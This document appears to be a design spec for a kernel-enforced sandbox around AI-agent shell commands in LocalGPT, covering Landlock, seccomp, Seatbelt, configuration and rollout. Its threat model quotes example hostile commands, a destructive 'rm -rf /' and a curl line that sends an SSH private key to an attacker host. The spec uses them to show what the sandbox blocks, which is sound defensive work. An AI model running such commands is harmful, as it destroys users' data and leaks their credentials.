# LocalGPT Shell Sandbox Spec

**Kernel-Enforced Execution Isolation Without Docker**

Landlock + Seccomp + Seatbelt  |  Single Binary  |  Zero Dependencies

| Field | Value |
|-------|-------|
| Version | 1.0 Draft |
| Date | February 10, 2026 |
| Author | Yi / LocalGPT |
| Status | Proposed |
| Priority | P0 — Critical Security Infrastructure |

---

## 1. Executive Summary

LocalGPT gives AI agents unrestricted shell access today. Any LLM-generated command runs with the full privileges of the user. This is the single largest security liability in the product — and the gap that most urgently differentiates LocalGPT from competitors who have already solved it.

This spec defines a kernel-enforced shell sandbox that restricts every LLM-spawned command to a declared filesystem scope with no network access, implemented entirely within LocalGPT's single Rust binary. No Docker. No containers. No external dependencies.

### 1.1 Why This Matters Now

**Security audits of AI agents have proven that application-level command blocklists are fundamentally bypassable.** GMO Flatt Security found 8 distinct bypass methods against Anthropic's regex-based command filters, forcing their migration to OS-level sandboxing. Every major AI coding agent — Claude Code, OpenAI Codex, Cursor — has shipped or is shipping kernel-enforced sandboxes. LocalGPT shipping without one is a blocker for adoption by security-conscious users and enterprise environments.

### 1.2 The OpenClaw Gap — and Our Advantage

OpenClaw's sandboxing requires Docker. Users must build a sandbox image (`openclaw-sandbox:bookworm-slim`), manage container lifecycle, configure volume mounts, and accept the operational overhead of a container runtime. Sandbox mode is off by default. A recent GitHub issue (#7827) noted that most OpenClaw users deploy agents in a weaker security posture than documentation assumes.

LocalGPT's value proposition is the opposite: security that works out of the box, with zero setup, inside a single binary. The sandbox activates automatically when the agent runs a shell command. No images to build. No Docker daemon to run. No configuration file to edit. This is the product advantage of a Rust single-binary architecture — and this spec capitalizes on it.

| Dimension | OpenClaw (Docker) | LocalGPT (This Spec) |
|-----------|-------------------|----------------------|
| Setup required | Build image, configure YAML | Zero — works at first run |
| External dependency | Docker daemon + images | None — single binary |
| Default posture | Off (opt-in sandbox) | On (opt-out with warning) |
| Startup latency | ~2–5s container spawn | <50ms fork+exec |
| Resource overhead | ~50–100MB per container | ~0 (process, not container) |
| Network isolation | Docker network: none | seccomp syscall blocking |
| Filesystem isolation | Bind mounts + read-only FS | Landlock path rules |
| Cross-platform | Linux/macOS (Docker Desktop) | Linux + macOS + Windows |
| Offline capable | Yes (if image cached) | Yes (always) |

---

## 2. Threat Model

The sandbox protects against three categories of harm from LLM-generated shell commands.

### 2.1 Threats Addressed

1. **Destructive file operations:** `rm -rf /`, overwriting critical configs, deleting SSH keys. The LLM may hallucinate destructive commands or follow prompt-injected instructions embedded in fetched web content or documents.
2. **Data exfiltration:** `curl attacker.com -d @~/.ssh/id_rsa`, piping secrets to external servers. Without network isolation, filesystem restrictions alone are insufficient — the agent can read allowed files and transmit them.
3. **Privilege escalation:** `chmod +s`, setuid exploits, ptrace-based sandbox escapes. The sandbox must be irrevocable and inherited by all child processes.

### 2.2 Threats Not Addressed

This sandbox does not protect against:

- Malicious LLM API responses (handled by prompt injection defenses, separate spec)
- Resource exhaustion beyond rlimits (CPU starvation, disk filling within allowed paths)
- Side-channel attacks (timing, cache-based information leakage)
- Attacks requiring kernel exploits (sandbox escape via kernel bugs)

### 2.3 Security Invariants

Every sandboxed command execution must guarantee the following properties:

1. **Filesystem confinement:** Write access only to the declared workspace directory. Read access to system binaries, libraries, and the workspace. No access to home directory secrets (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config`).
2. **Network denial:** Zero network connectivity. No TCP, UDP, or Unix domain socket operations.
3. **Irrevocability:** Once applied, restrictions cannot be removed by the sandboxed process or its children.
4. **Privilege ceiling:** No setuid, no ptrace, no new capabilities. `NO_NEW_PRIVS` enforced.
5. **Parent isolation:** The LocalGPT parent process is never restricted. Only the forked child inherits the sandbox.

---

## 3. Architecture

### 3.1 The argv[0] Re-Exec Pattern

LocalGPT adopts the argv[0] dispatch pattern pioneered by OpenAI Codex. The single binary contains both the agent runtime and a sandbox helper. When spawning a sandboxed command, the binary re-executes itself with `argv[0]` set to a sentinel value, triggering sandbox setup in a clean, single-threaded child process.

**Why re-exec instead of pre_exec?** The `pre_exec` approach runs sandbox setup in a forked child that inherits the parent's threads, heap state, and file descriptors. This creates fork-safety hazards in LocalGPT's multithreaded tokio runtime. Re-exec gives us a clean process with no inherited state, and the sandbox policy is serializable and debuggable from the command line.

**Execution flow:**

```
localgpt agent runtime
       |
       | fork + exec(self, argv[0]="localgpt-sandbox")
       |     + policy JSON as arg
       |     + "bash -c <command>" as remaining args
       v
localgpt-sandbox (child process, single-threaded)
       |
       | 1. Deserialize SandboxPolicy from args
       | 2. Pre-open PathFds for Landlock rules
       | 3. Apply resource limits (rlimits)
       | 4. Apply Landlock filesystem rules
       | 5. Apply seccomp network deny filter
       | 6. exec("bash", "-c", command)
       v
bash -c <user_command>  (fully sandboxed)
```

### 3.2 Sandbox Policy

Every shell execution carries a serialized `SandboxPolicy` that declares exactly what the sandboxed process may access. The policy is JSON-serializable for debuggability and testability.

```rust
struct SandboxPolicy {
    // Filesystem
    workspace_path: PathBuf,         // R/W access
    read_only_paths: Vec<PathBuf>,   // R/O access (system dirs)
    deny_paths: Vec<PathBuf>,        // Explicit denials

    // Network
    network_access: NetworkPolicy,   // Deny | AllowProxy(socket_path)

    // Resources
    timeout_secs: u64,               // Kill after N seconds
    max_output_bytes: u64,           // Truncate stdout/stderr
    max_file_size_bytes: u64,        // RLIMIT_FSIZE
    max_processes: u32,              // RLIMIT_NPROC

    // Behavior
    level: SandboxLevel,             // Full | Standard | Minimal | None
}
```

### 3.3 Automatic Policy Construction (Zero Configuration)

**Users never write sandbox policies.** The `SandboxPolicy` is auto-derived at runtime from two inputs: the **sandbox mode** (a single high-level setting) and the **current workspace** (already known to LocalGPT). The user picks a mode; LocalGPT resolves everything else.

**Sandbox modes:**

| Mode | Filesystem | Network | When to Use |
|------|-----------|---------|-------------|
| `workspace-write` | R/W in workspace + `/tmp`; R/O system dirs; deny credentials | Denied | **Default.** Normal agent operation — editing code, running tests, building projects. |
| `read-only` | R/O everywhere allowed; no writes anywhere | Denied | Exploratory analysis, code review, auditing. |
| `full-access` | Unrestricted | Unrestricted | Explicitly opted-in; requires `--dangerously-allow-full-access` flag or config acknowledgment. |

**Policy resolution flow:**

```
1. Determine workspace
   → CLI: cwd or --workspace flag
   → HTTP API: session's workspace_path
   → Heartbeat: agent's configured workspace

2. Determine mode
   → config.toml [sandbox] level    (default: "workspace-write")
   → CLI flag --sandbox <mode>      (overrides config)
   → Per-agent override             (future: Phase 3)

3. Build SandboxPolicy automatically
   → workspace_path     = resolved workspace
   → read_only_paths    = [/usr, /lib, /lib64, /bin, /sbin, /etc, /dev]
   → deny_paths          = [~/.ssh, ~/.aws, ~/.gnupg, ~/.config, ~/.docker]
   → network_access      = Deny (unless full-access mode)
   → timeout_secs        = config value or 120
   → max_output_bytes    = config value or 1MB
   → level              = detect_sandbox_capabilities()

4. Serialize → pass to child via argv[0] re-exec
```

**The `[sandbox]` config section and `[sandbox.allow_paths]` exist only as escape hatches** for power users who need to grant access beyond the defaults — for example, mounting a shared dataset directory as read-only or extending the timeout for long builds.

**How Codex compares:** OpenAI Codex uses the same auto-derivation approach with three modes (`read-only`, `workspace-write`, `danger-full-access`). The key difference: Codex defaults to `read-only` and requires the user to opt into writes. LocalGPT defaults to `workspace-write` because our primary use case is autonomous agent work (editing files, running builds, executing skills) where read-only would generate constant approval prompts. This matches OpenClaw's workspace behavior where agents routinely write files and run commands within their workspace.

| Decision | Codex | LocalGPT | Rationale |
|----------|-------|----------|-----------|
| Default mode | `read-only` | `workspace-write` | LocalGPT agents are autonomous workers, not just coding assistants. Read-only would require approval on every file write, defeating the purpose. |
| Write scope | cwd + `/tmp` | cwd + `/tmp` + sandbox scratch | Identical effective scope. |
| Network default | Denied | Denied | Industry consensus. |
| Extra writable paths | `writable_roots` list | `[sandbox.allow_paths] write` | Same mechanism, different config key name. |
| Network opt-in | `network_access = true` | `policy = "proxy"` (future) | Codex allows raw network; LocalGPT plans proxy-mediated access for auditability. |

### 3.4 Platform Dispatch

Sandbox enforcement is implemented per-platform behind a shared `SandboxEnforcer` trait. The correct implementation is selected at compile time via `#[cfg(target_os)]`.

| Platform | Filesystem Isolation | Network Isolation | Dependencies |
|----------|---------------------|-------------------|--------------|
| Linux | Landlock LSM (V1–V5) | seccomp-bpf syscall deny | `landlock` + `seccompiler` crates |
| macOS | Seatbelt SBPL profiles | Seatbelt `(deny network*)` | `sandbox-exec` subprocess |
| Windows | AppContainer ACLs | Restricted tokens | `windows` crate |

### 3.5 Graceful Degradation

Not all Linux kernels support Landlock (requires 5.13+). Not all distributions enable unprivileged user namespaces. The sandbox detects available capabilities at startup and operates at the highest available level.

| Level | Requirements | Protections | UX |
|-------|-------------|-------------|-----|
| Full | Landlock V4+ + seccomp + userns | Filesystem + network + PID + mount isolation | Silent — no prompt |
| Standard | Landlock V1+ + seccomp | Filesystem + network isolation | Silent — no prompt |
| Minimal | seccomp only | Network blocking only | Warning banner on first use |
| None | No kernel support | rlimits + timeout only | Explicit user acknowledgment required |

**Critical design decision:** Unlike Codex (which panics on missing Landlock), LocalGPT warns and degrades. Unlike OpenClaw (which defaults to no sandbox), LocalGPT defaults to the highest available level. The user is never silently unprotected.

---

## 4. Implementation: Linux

### 4.1 Landlock Filesystem Rules

Landlock rules follow a deny-by-default model. Once a ruleset "handles" an access category, that access is denied everywhere except where explicitly permitted. Rules are applied in the re-exec'd child process before exec'ing bash.

| Path | Access | Rationale |
|------|--------|-----------|
| `/usr`, `/lib`, `/lib64`, `/bin`, `/sbin` | Read + Execute | System binaries and libraries |
| `/etc` | Read only | System configuration (DNS, locales) |
| `/dev/null`, `/dev/urandom`, `/dev/zero` | Read + Write | Standard devices |
| `/proc/self` | Read only | Process introspection |
| `/tmp/localgpt-sandbox-*` | Read + Write | Ephemeral scratch space |
| `<workspace>` | Read + Write | User's project directory |
| `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config` | **DENIED** | Credential directories |

### 4.2 Seccomp Network Deny

Seccomp installs a BPF filter that returns `EPERM` for all network-related syscalls. This is a targeted denylist — not a full syscall allowlist — because shell commands (bash, ls, grep, etc.) collectively require 60–100+ distinct syscalls that are infeasible to enumerate exhaustively.

**Denied syscalls:** `socket`, `connect`, `accept`, `accept4`, `bind`, `listen`, `sendto`, `sendmsg`, `sendmmsg`, `recvfrom`, `recvmsg`, `recvmmsg`, `ptrace`.

**Order of operations matters:** Apply namespaces → Landlock → seccomp. Seccomp must be last because it blocks the syscalls that Landlock setup requires.

### 4.3 Resource Limits

| Resource | Default Limit | Config Key |
|----------|--------------|------------|
| Execution timeout | 120 seconds | `sandbox.timeout_secs` |
| Max output | 1 MB stdout + 1 MB stderr | `sandbox.max_output_bytes` |
| Max file size | 50 MB (`RLIMIT_FSIZE`) | `sandbox.max_file_size_bytes` |
| Max processes | 64 (`RLIMIT_NPROC`) | `sandbox.max_processes` |
| Max open files | 256 (`RLIMIT_NOFILE`) | `sandbox.max_open_files` |

---

## 5. Implementation: macOS and Windows

### 5.1 macOS: Seatbelt Profiles

macOS sandboxing uses Apple's Seatbelt framework via the `sandbox-exec` command. Despite being officially deprecated since macOS 10.12, it remains functional through macOS 15+ and is used by Bazel, OpenAI Codex, and Google Gemini CLI. LocalGPT generates SBPL profiles dynamically from the `SandboxPolicy` struct.

**Risk:** SBPL is undocumented by Apple and profiles may break between macOS versions. LocalGPT maintains a test suite that validates profile behavior on each supported macOS version. If `sandbox-exec` becomes unavailable, the fallback is `sandbox_init()` via FFI.

### 5.2 Windows: AppContainers

Windows sandboxing uses restricted security tokens via `CreateRestrictedToken()` combined with Job Objects and AppContainers. OpenAI's `codex-windows-sandbox` crate (Apache 2.0) serves as the reference implementation. Windows support ships as experimental in Phase 2 of this spec.

---

## 6. User Experience

### 6.1 Default Behavior

Sandbox is on by default. No configuration required. The user sees a subtle indicator in CLI and web GUI output showing that the command ran sandboxed:

```
🔒 Running sandboxed: npm test
  Workspace: /home/yi/project
  Network: denied

  > test
  > jest --coverage
  PASS src/index.test.ts
  ...

✓ Completed in 4.2s (sandbox: standard)
```

### 6.2 Configuration

Users can tune sandbox behavior in `config.toml`. The design philosophy is that the default is always safe, and relaxation requires explicit intent.

```toml
[sandbox]
enabled = true                        # default: true
level = "auto"                        # auto | full | standard | minimal | none
workspace = "."                       # default: current working directory
timeout_secs = 120                    # default: 120
max_output_bytes = 1048576            # default: 1MB

[sandbox.allow_paths]
read = ["/data/datasets"]             # additional read-only paths
write = ["/tmp/builds"]               # additional writable paths

[sandbox.network]
policy = "deny"                       # deny | proxy
# proxy_socket = "/tmp/localgpt.sock" # for future proxy support
```

### 6.3 Diagnostic Command

A built-in diagnostic command lets users inspect and test the sandbox:

```
$ localgpt sandbox status

Sandbox Capabilities:
  Landlock:  v5 (kernel 6.10+)     ✓
  Seccomp:   available              ✓
  Userns:    available              ✓
  Level:     Full

$ localgpt sandbox test

Running sandbox smoke tests...
  ✓ Write to workspace:     allowed
  ✓ Write outside workspace: denied (EACCES)
  ✓ Read ~/.ssh/id_rsa:     denied (EACCES)
  ✓ Network (curl):         denied (EPERM)
  ✓ Timeout enforcement:    killed after 5s
  ✓ Child process inherits: confirmed
All 6 tests passed.
```

> **OpenClaw comparison:** OpenClaw provides `openclaw sandbox explain` for debugging sandbox configuration. LocalGPT's `localgpt sandbox test` goes further by actively verifying enforcement, not just displaying config.

---

## 7. Integration with Existing Systems

### 7.1 Tool Execution Pipeline

The sandbox integrates into LocalGPT's existing tool execution pipeline at the point where shell commands are spawned. All existing entry points — HTTP API, CLI, desktop GUI, heartbeat runner — route through the same `execute_tool()` function, ensuring uniform enforcement.

```
Agent Turn
  → Tool Call: { name: "bash", args: { command: "npm test" } }
  → execute_tool()
      → tool_requires_sandbox("bash") → true
      → build_sandbox_policy(workspace, config)
      → run_sandboxed(command, policy)
          → fork + exec(self, argv[0]="localgpt-sandbox")
          → child: apply_sandbox(policy) → exec(bash)
      → collect output + exit code
  → Return tool result to agent
```

### 7.2 Tools Subject to Sandboxing

| Tool | Sandboxed? | Rationale |
|------|-----------|-----------|
| `bash` / `exec` | Yes — always | Arbitrary command execution |
| `write_file` | Yes — path-validated | File writes restricted to workspace |
| `read_file` | Yes — path-validated | Prevents reading credentials |
| `edit_file` | Yes — path-validated | Same as write_file |
| `web_fetch` | No — separate SSRF protection | Handled by URL validation layer |
| `memory_search` | No | Internal SQLite query, no shell |
| `skills` | Configurable | Depends on skill implementation |

### 7.3 Concurrency Interaction

The sandbox interacts with LocalGPT's three-layer concurrency protection system. The workspace lock (Layer 1) prevents concurrent writes to session files. The turn gate (Layer 2) serializes agent turns. The sandbox (this spec) restricts what each turn can access. These layers compose naturally — the sandbox runs inside a turn, which runs inside a workspace lock.

---

## 8. Rollout Plan

### Phase 1: Linux Foundation (4 weeks)

**Goal:** Ship Landlock + seccomp sandbox for Linux with auto-detection and graceful degradation.

1. **SandboxPolicy struct + serialization:** Define the policy schema, implement JSON serialization, write unit tests.
2. **argv[0] re-exec dispatcher:** Implement `main()` dispatch, child process setup, policy deserialization.
3. **Landlock enforcement:** Implement filesystem rules with ABI version negotiation and `BestEffort` degradation.
4. **Seccomp enforcement:** Implement network syscall deny filter using seccompiler.
5. **Capability detection:** Implement `detect_sandbox_capabilities()` for startup diagnostics.
6. **Integration:** Wire into `execute_tool()` pipeline, add CLI `sandbox status`/`test` commands.
7. **Testing:** Smoke tests, escape attempt tests, performance benchmarks.

### Phase 2: Cross-Platform + Polish (3 weeks)

**Goal:** Add macOS Seatbelt support, Windows experimental support, and UX refinements.

1. **macOS Seatbelt:** SBPL profile generation from `SandboxPolicy`, `sandbox-exec` subprocess spawning.
2. **Windows AppContainer:** Restricted token creation, Job Object limits (experimental).
3. **Config file support:** Parse `[sandbox]` section from `config.toml`.
4. **Web GUI indicators:** Show sandbox status in the web interface tool output.
5. **Documentation:** User guide, security model explanation, troubleshooting.

### Phase 3: Advanced Features (Future)

- **Network proxy mode:** Allow controlled network access through a LocalGPT-managed proxy with domain allowlists (similar to Claude Code's approach).
- **Per-skill sandbox policies:** Skills can declare their own filesystem and network requirements.
- **Audit logging:** Log every sandboxed execution with policy, command, exit code, duration, and any denied operations.
- **Sandbox profiles:** Pre-built policy templates (e.g., "coding", "data-analysis", "minimal") similar to OpenClaw's tool profiles.

---

## 9. Competitive Positioning

This feature transforms LocalGPT's security story from "behind" to "differentiated." The competitive landscape as of early 2026:

| Product | Sandbox Approach | Default | Dependency | Limitation |
|---------|-----------------|---------|------------|------------|
| Claude Code | Bubblewrap + seccomp (Linux), Seatbelt (macOS) | On | bwrap binary | External binary dependency |
| Codex CLI | Landlock + seccomp (Linux), Seatbelt, AppContainer | On | None (Rust) | Panics if Landlock missing |
| OpenClaw | Docker containers | Off | Docker daemon + images | Heavy setup, off by default |
| Cursor | Seatbelt (macOS only) | On | None | macOS only; leaks ~/.ssh |
| Aider | None | N/A | N/A | Zero sandboxing |
| Cline | Human approval only | N/A | N/A | No OS-level isolation; RCE vulns |
| **LocalGPT** | **Landlock+seccomp+Seatbelt+AppContainer** | **On** | **None (Rust)** | **Degrades gracefully** |

**LocalGPT's unique position:** The only product that combines zero-dependency kernel-enforced sandboxing with graceful degradation and default-on behavior across three platforms. This is a direct consequence of the single-binary Rust architecture — a structural advantage that Node.js (OpenClaw) and Python (Aider, AutoGPT) tools cannot replicate.

---

## 10. Risks and Mitigations

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Landlock ABI changes break rules | Low | Medium | Version negotiation via `Compatible` trait; `BestEffort` mode |
| macOS removes sandbox-exec | Low | High | Monitor deprecation signals; prepare `sandbox_init()` FFI fallback |
| Sandbox breaks legitimate commands | Medium | High | Extensive smoke tests; `localgpt sandbox test` diagnostic; quick config escape hatch |
| Performance regression from fork+exec | Low | Low | Benchmarks show <50ms overhead; acceptable for shell commands |
| Users disable sandbox globally | Medium | Medium | Require explicit acknowledgment; log warning on every unsandboxed execution |
| Kernel too old for Landlock | Medium | Medium | Graceful degradation to seccomp-only; warn user clearly |

---

## 11. Success Criteria

1. **Security:** Zero sandbox escapes in adversarial testing (red team exercise with 50+ escape vectors from published CVEs and security research).
2. **Compatibility:** 95%+ of legitimate shell commands succeed in sandbox without configuration changes (measured against a corpus of 500 common development commands).
3. **Performance:** <50ms added latency per sandboxed command execution (p99).
4. **Adoption:** Default-on with <5% of users disabling sandbox in the first 90 days.
5. **Platform coverage:** Linux (full), macOS (full), Windows (experimental) within 7 weeks of development start.

---

## 12. Appendix: Key Rust Crates

| Crate | Version | Purpose | Provenance |
|-------|---------|---------|------------|
| `landlock` | 0.4.x | Landlock LSM Rust bindings | Maintained by kernel developer; 5.2M downloads |
| `seccompiler` | 0.4.x | Seccomp-bpf filter compilation | Extracted from AWS Firecracker; pure Rust |
| `nix` | 0.29.x | Unix API bindings (rlimits, signals) | 11M+ downloads; mature |
| `serde_json` | 1.x | SandboxPolicy serialization | Standard Rust JSON library |
| `windows` | 0.58.x | Win32 API bindings (AppContainer) | Microsoft-maintained |

**Reference implementation:** OpenAI Codex CLI (Apache 2.0) provides a complete Rust implementation of the Landlock + seccomp + Seatbelt + AppContainer architecture at github.com/openai/codex. LocalGPT's implementation draws on this reference while adapting the architecture to LocalGPT's specific needs (persistent memory, heartbeat tasks, multi-entry-point concurrency).
